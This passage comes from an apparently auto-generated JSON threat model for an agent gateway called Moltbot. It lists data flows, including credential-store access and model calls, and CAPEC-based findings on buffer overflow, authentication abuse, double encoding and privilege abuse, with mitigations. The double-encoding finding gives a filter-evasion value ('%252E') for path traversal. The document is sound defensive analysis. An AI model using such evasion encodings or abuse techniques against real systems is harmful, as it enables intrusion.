"invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Model Provider Credentials"], "description": "", "dstPort": -1, "findings": ["341", "342", "343", "344", "345", "346", "347"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Model inference request", "note": "", "order": 9, "overrides": [], "protocol": "HTTPS", "response": null, "responseTo": null, "severity": 5, "sink": "LLM Provider APIs", "source": "Agent Runtime", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["348", "349", "350", "351", "352", "353", "354"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Model inference response", "note": "", "order": 10, "overrides": [], "protocol": "HTTPS", "response": null, "responseTo": null, "severity": 5, "sink": "Agent Runtime", "source": "LLM Provider APIs", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["355", "356", "357", "358", "359", "360", "361"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Dispatch session to agent runtime", "note": "", "order": 11, "overrides": [], "protocol": "local", "response": null, "responseTo": null, "severity": 5, "sink": "Agent Runtime", "source": "Gateway WS/HTTP Server", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["362", "363", "364", "365", "366", "367", "368"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Agent output + tool results", "note": "", "order": 12, "overrides": [], "protocol": "local", "response": null, "responseTo": null, "severity": 5, "sink": "Gateway WS/HTTP Server", "source": "Agent Runtime", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Runtime Configuration"], "description": "", "dstPort": -1, "findings": ["369", "370", "371", "372", "373", "374", "375"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Read/write configuration", "note": "", "order": 13, "overrides": [], "protocol": "file", "response": null, "responseTo": null, "severity": 5, "sink": "Config Store (moltbot.json)", "source": "Gateway WS/HTTP Server", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Model Provider Credentials"], "description": "", "dstPort": -1, "findings": ["376", "377", "378", "379", "380", "381", "382"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Read/write credentials", "note": "", "order": 14, "overrides": [], "protocol": "file", "response": null, "responseTo": null, "severity": 5, "sink": "Credentials Store (~/.clawdbot/credentials)", "source": "Gateway WS/HTTP Server", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["383", "384", "385", "386", "387", "388", "389"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Update session metadata", "note": "", "order": 15, "overrides": [], "protocol": "file", "response": null, "responseTo": null, "severity": 5, "sink": "Session Store (sessions.json)", "source": "Gateway WS/HTTP Server", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Session Messages + Tool Output"], "description": "", "dstPort": -1, "findings": ["390", "391", "392", "393", "394", "395", "396"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Append transcripts", "note": "", "order": 16, "overrides": [], "protocol": "file", "response": null, "responseTo": null, "severity": 5, "sink": "Transcript Store (*.jsonl)", "source": "Gateway WS/HTTP Server", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Operational Logs"], "description": "", "dstPort": -1, "findings": ["397", "398", "399", "400", "401", "402", "403"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Write operational logs", "note": "", "order": 17, "overrides": [], "protocol": "file", "response": null, "responseTo": null, "severity": 5, "sink": "Log Store (~/.clawdbot/logs)", "source": "Gateway WS/HTTP Server", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Tool Invocation Requests/Results"], "description": "", "dstPort": -1, "findings": ["404", "405", "406", "407", "408", "409", "410"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Invoke node tools", "note": "", "order": 18, "overrides": [], "protocol": "WebSocket", "response": null, "responseTo": null, "severity": 5, "sink": "Node Host Agent", "source": "Agent Runtime", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Tool Invocation Requests/Results"], "description": "", "dstPort": -1, "findings": ["411", "412", "413", "414", "415", "416", "417"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Node tool responses", "note": "", "order": 19, "overrides": [], "protocol": "WebSocket", "response": null, "responseTo": null, "severity": 5, "sink": "Agent Runtime", "source": "Node Host Agent", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Tool Invocation Requests/Results"], "description": "", "dstPort": -1, "findings": ["418", "419", "420", "421", "422", "423", "424"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Browser control requests", "note": "", "order": 20, "overrides": [], "protocol": "HTTP/WebSocket", "response": null, "responseTo": null, "severity": 5, "sink": "Browser Control Server", "source": "Agent Runtime", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Tool Invocation Requests/Results"], "description": "", "dstPort": -1, "findings": ["425", "426", "427", "428", "429", "430", "431"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Browser control responses", "note": "", "order": 21, "overrides": [], "protocol": "HTTP/WebSocket", "response": null, "responseTo": null, "severity": 5, "sink": "Agent Runtime", "source": "Browser Control Server", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Inbound/Outbound Media Attachments"], "description": "", "dstPort": -1, "findings": ["432", "433", "434", "435", "436", "437", "438"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Inbound media to Gateway", "note": "", "order": 22, "overrides": [], "protocol": "provider-specific", "response": null, "responseTo": null, "severity": 5, "sink": "Channel Adapters", "source": "Channel Provider APIs", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}, {"assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": ["Inbound/Outbound Media Attachments"], "description": "", "dstPort": -1, "findings": ["439", "440", "441", "442", "443", "444", "445"], "implementsCommunicationProtocol": false, "inBoundary": null, "inScope": true, "isResponse": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Outbound media to channels", "note": "", "order": 23, "overrides": [], "protocol": "provider-specific", "response": null, "responseTo": null, "severity": 5, "sink": "Channel Provider APIs", "source": "Channel Adapters", "sourceFiles": [], "srcPort": -1, "tlsVersion": "TLSVersion.NONE", "usesSessionTokens": false, "usesVPN": false}], "threatsExcluded": [], "assumptions": [], "description": "Moltbot is a CLI + always-on Gateway that connects messaging channels, LLM providers, and tool-capable nodes. The Gateway exposes a WS/HTTP control plane, persists session state, and brokers inbound/outbound messages.", "excluded_findings": [], "findings": [{"assumption": null, "condition": "target.controls.checksInputBounds is False", "cvss": "", "description": "Overflow Buffers", "details": "Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.", "example": "The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.", "id": "1", "mitigations": "Use a language or compiler that performs automatic bounds checking. Use secure functions not vulnerable to buffer overflow. If you have to use dangerous functions, make sure that you do boundary checking. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Use OS-level preventative functionality. Not a complete solution. Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.", "references": "https://capec.mitre.org/data/definitions/100.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/119.html, http://cwe.mitre.org/data/definitions/680.html", "response": "", "severity": "Very High", "target": "Moltbot CLI", "threat_id": "INP02"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Authentication Abuse/ByPass", "details": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "2", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "AA01"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Double Encoding", "details": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.", "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.", "id": "3", "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).", "references": "https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html", "response": "", "severity": "Medium", "target": "Moltbot CLI", "threat_id": "DE02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "4", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, 